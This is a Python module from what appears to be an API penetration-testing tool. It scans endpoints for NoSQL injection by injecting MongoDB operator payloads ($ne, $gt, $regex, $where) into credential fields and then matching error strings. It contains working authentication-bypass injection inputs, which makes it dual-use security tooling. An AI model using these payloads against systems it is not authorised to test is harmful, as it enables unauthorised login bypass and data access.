"""NoSQL Injection Scanner — tests endpoints with operator-injection payloads and detects errors/bypasses."""

import re
from api_pntst.utils.http_client import http_request

# JSON body payloads — replace field values with MongoDB-style query operators.
# Sent as individual dicts so each probe targets the chosen parameter keys.
_JSON_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
]

# Query-string payloads — framework-level array notation parsed by many Node/PHP
# servers into nested objects (e.g. ?field[$ne]=x → {field: {$ne: "x"}}).
_QS_PAYLOADS = [
    ("[$ne]", "x"),
    ("[$gt]", ""),
    ("[$regex]", ".*"),
    ("[$exists]", "true"),
]

# Error strings emitted by common NoSQL engines.
_ERROR_PATTERNS = re.compile(
    r"(MongoError|MongoServerError|MongoParseError|BSONTypeError"
    r"|Cast to ObjectId failed|CastError"
    r"|\$where is not allowed|\$where.*disabled"
    r"|unknown operator|Unrecognized expression"
    r"|bad operator|\$gt|invalid operator"
    r"|SyntaxError.*JSON|unexpected token"
    r"|CouchDB.*error|redis.*ERR|WRONGTYPE)",
    re.IGNORECASE | re.DOTALL,
)

# Field names commonly used as credentials / lookup keys.
_DEFAULT_TARGETS = ["username", "email", "user", "login", "id", "query", "search", "name"]


def nosql_injection_scanner(context: dict) -> list[dict]:
    findings: list[dict] = []
    seen: set[str] = set()  # avoid duplicate findings per endpoint

    for endpoint in context["endpoints"]:
        method = endpoint["method"]
        url = endpoint["url"]
        parameters = endpoint.get("parameters", [])

        if method not in ("GET", "POST", "PUT", "PATCH"):
            continue

        param_names = [
            p["name"]
            for p in parameters
            if isinstance(p, dict) and p.get("in") in ("query", "path", "formData", "body")
        ]
        targets = param_names or _DEFAULT_TARGETS
        verify_ssl = context.get("verify_ssl", True)
        endpoint_key = f"{method} {url}"

        # ------------------------------------------------------------------ #
        # 1. Query-string operator injection (effective against GET and POST)  #
        # ------------------------------------------------------------------ #
        for suffix, value in _QS_PAYLOADS:
            if endpoint_key in seen:
                break
            params = {f"{t}{suffix}": value for t in targets}
            try:
                resp = http_request(
                    "GET", url,
                    timeout=context["timeout"],
                    headers=context["extra_headers"],
                    params=params,
                    verify_ssl=verify_ssl,
                )
            except Exception:
                continue

            if resp is None:
                continue

            body = resp.text or ""
            finding = _evaluate_response(resp, body, endpoint_key, f"?field{suffix}={value}")
            if finding:
                findings.append(finding)
                seen.add(endpoint_key)

        # ------------------------------------------------------------------ #
        # 2. JSON body operator injection (POST / PUT / PATCH only)           #
        # ------------------------------------------------------------------ #
        if method not in ("POST", "PUT", "PATCH"):
            continue

        for op_payload in _JSON_PAYLOADS:
            if endpoint_key in seen:
                break
            json_body = {t: op_payload for t in targets}
            try:
                resp = http_request(
                    method, url,
                    timeout=context["timeout"],
                    headers={"Content-Type": "application/json", **context["extra_headers"]},
                    json_data=json_body,
                    verify_ssl=verify_ssl,
                )
            except Exception:
                continue

            if resp is None:
                continue

            body = resp.text or ""
            payload_repr = f'{{"field": {op_payload}}}'
            finding = _evaluate_response(resp, body, endpoint_key, payload_repr)
            if finding:
                findings.append(finding)
                seen.add(endpoint_key)

    return findings


def _evaluate_response(resp, body: str, endpoint_key: str, payload_repr: str) -> dict | None:
    """Return a finding dict if the response indicates a NoSQL injection issue, else None."""

    if _ERROR_PATTERNS.search(body):
        return {
            "scanner": "NoSQL Injection",
            "severity": "critical",
            "endpoint": endpoint_key,
            "title": "NoSQL Injection Vulnerability Detected",
            "description": (
                f"The endpoint returned a NoSQL engine error when injected with: {payload_repr}"
            ),
            "evidence": body[:300],
            "payload": payload_repr,
            "status_code": resp.status_code,
            "remediation": (
                "Validate and sanitize all user-supplied input before passing it to the database. "
                "Use an allow-list of expected value types (strings, numbers) and reject objects/operators. "
                "For MongoDB, disable server-side JavaScript ($where) and use schema validation."
            ),
            "references": [
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html",
            ],
        }

    if resp.status_code >= 500:
        return {
            "scanner": "NoSQL Injection",
            "severity": "medium",
            "endpoint": endpoint_key,
            "title": "Server Error on NoSQL Injection Attempt",
            "description": (
                f"Server returned HTTP {resp.status_code} for NoSQL operator payload: {payload_repr}. "
                "This may indicate an unhandled NoSQL injection vulnerability."
            ),
            "evidence": body[:200],
            "payload": payload_repr,
            "status_code": resp.status_code,
            "remediation": (
                "Ensure all database query parameters are validated against an expected type/schema. "
                "Reject requests that contain unexpected object or operator values."
            ),
            "references": [
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
            ],
        }

    return None
